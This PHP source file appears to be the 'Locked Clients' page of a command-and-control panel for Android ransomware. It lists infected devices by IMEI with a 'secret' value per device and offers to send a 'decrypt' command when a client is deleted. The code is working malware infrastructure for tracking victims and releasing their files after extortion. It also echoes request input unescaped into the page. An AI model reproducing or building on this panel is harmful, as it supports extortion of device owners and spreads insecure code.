<?php
session_start();
require_once 'includes/auth_validate.php';
require_once './config/config.php';

// Serve deletion if POST method and del_id is set.

//Get data from query string
$search_string = filter_input(INPUT_GET, 'search_string');
$online = filter_input(INPUT_GET, 'online');


$filter_col = filter_input(INPUT_GET, 'filter_col');
$order_by = filter_input(INPUT_GET, 'order_by');
$page = filter_input(INPUT_GET, 'page');
$pagelimit = 20;
if ($page == "") {
    $page = 1;
}
// If filter types are not selected we show latest added data first
if ($filter_col == "") {
    $filter_col = "id";
}
if ($order_by == "") {
    $order_by = "desc";
}

// select the columns
$select = array('id', 'imei', 'client_id','version','country','lastConnect','firstConnect','secret');

// select only online
if ($online){
    $time = time() - 300;
    $db->where('lastConnect', $time, '>=');
}
// If user searches
if ($search_string)
{
    $db->where('imei', '%' . $search_string . '%', 'like');
}


if ($order_by)
{
    $db->orderBy($filter_col, $order_by);
} else {
    $db->orderBy('lastConnect', 'Desc');
}

$db->pageLimit = $pagelimit;
$clients = $db->arraybuilder()->paginate("locked_clients", $page, $select);
$total_pages = $db->totalPages;

// get columns for order filter
foreach ($clients as $value) {
    foreach ($value as $col_name => $col_value) {
        $filter_options[$col_name] = $col_name;
    }
    //execute only once
    break;
}
include_once 'includes/header.php';
?>
<div id="page-wrapper">
    <div class="row">

        <div class="col-lg-6">
            <h1 class="page-header">Locked Clients</h1>
        </div>
        <div class="col-lg-6" style="">
            <div class="page-action-links text-right">
                <button class="btn btn-danger delete_btn" onclick="deleteIds('delete_locked_client.php')" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span> Delete selected clients </button>
            </div>
        </div>
    </div>
    <?php include('./includes/flash_messages.php') ?>
    <!--    Begin filter section-->
    <div class="well text-center filter-form">
        <form class="form form-inline" action="">
            <label for="input_search">Search IMEI or phone number</label>
            <input type="text" id="input_search" name="search_string" value="<?php echo $search_string; ?>">
            <label for ="input_order">Order By</label>
            <select name="filter_col">

                <?php
                foreach ($filter_options as $option) {
                    ($filter_col === $option) ? $selected = "selected" : $selected = "";
                    echo ' <option value="' . $option . '" ' . $selected . '>' . $option . '</option>';
                }
                ?>

            </select>

            <select name="order_by" class="" id="input_order">

                <option value="Asc" <?php
                if ($order_by == 'Asc') {
                    echo "selected";
                }
                ?> >Asc</option>
                <option value="Desc" <?php
                if ($order_by == 'Desc') {
                    echo "selected";
                }
                ?>>Desc</option>
            </select>
            <label for ="input_order">Online</label><input type="checkbox" class="form-check-input" name="online">
            <input type="submit" value="Go" class="btn btn-primary">

        </form>
    </div>
    <!--   Filter section end-->

    <hr>
    <table class="table table-striped table-bordered table-condensed">
        <thead>
        <tr>
            <th class="header"><input type="checkbox" class="form-check-input" id="chk" onclick="chkAll()"></th>
            <th></th>
            <th>IMEI</th>
            <th>ID</th>
            <th>Version</th>
            <th></th>
            <th>secret</th>
            <th>Actions</th>
        </tr>
        </thead>
        <tbody>
        <?php
        foreach ($clients as $row) { ?>
            <tr>
                <td><input type="checkbox" class="form-check-input" id="chk_imei" value="<?php echo $row['imei'] ?>"></td>
                <td><i class="fa fa-android" aria-hidden="true" <?php if ((time() - $row['lastConnect'])<300) {echo 'style="color:#5bb85c;"';}?>></i></td>
                <td><?php echo $row['imei'] ?></td>
                <td><?php echo $row['client_id'] ?></td>
                <td><?php echo $row['version'] ?> </td>
                <td><?php echo $row['country'] ?></td>
                <td><?php echo $row['secret'] ?></td>
                <td>
                    <a href=""  class="btn btn-danger delete_btn" data-toggle="modal" data-target="#confirm-delete-<?php echo $row['id'] ?>" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span></td>
            </tr>

            <!-- Delete Confirmation Modal-->
            <div class="modal fade" id="confirm-delete-<?php echo $row['id'] ?>" role="dialog">
                <div class="modal-dialog">
                    <form action="delete_locked_client.php" method="POST">
                        <!-- Modal content-->
                        <div class="modal-content">
                            <div class="modal-header">
                                <button type="button" class="close" data-dismiss="modal">&times;</button>
                                <h4 class="modal-title">Confirm</h4>
                            </div>
                            <div class="modal-body">

                                <input type="hidden" name="del_id" id = "del_id" value="<?php echo $row['id'] ?>">

                                <p>Are you sure you want to decrypt client? Command for decrypt will be sent after delete client from this list.</p>
                            </div>
                            <div class="modal-footer">
                                <button type="submit" class="btn btn-default pull-left">Yes</button>
                                <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                            </div>
                        </div>
                    </form>

                </div>
            </div>




        <?php } ?>
        </tbody>
    </table>



    <!--    Pagination links-->
    <div class="text-center">

        <?php
        if (!empty($_GET)) {
            //we must unset $_GET[page] if built by http_build_query function
            unset($_GET['page']);
            $http_query = "?" . http_build_query($_GET);
        } else {
            $http_query = "?";
        }
        if ($total_pages > 1) {
            echo '<ul class="pagination text-center">';
            for ($i = 1; $i <= $total_pages; $i++) {
                ($page == $i) ? $li_class = ' class="active"' : $li_class = "";
                echo '<li' . $li_class . '><a href="clients.php' . $http_query . '&page=' . $i . '">' . $i . '</a></li>';
            }
            echo '</ul></div>';
        }
        ?>
    </div>

</div>
<!--Main container end-->


<?php include_once './includes/footer.php'; ?>

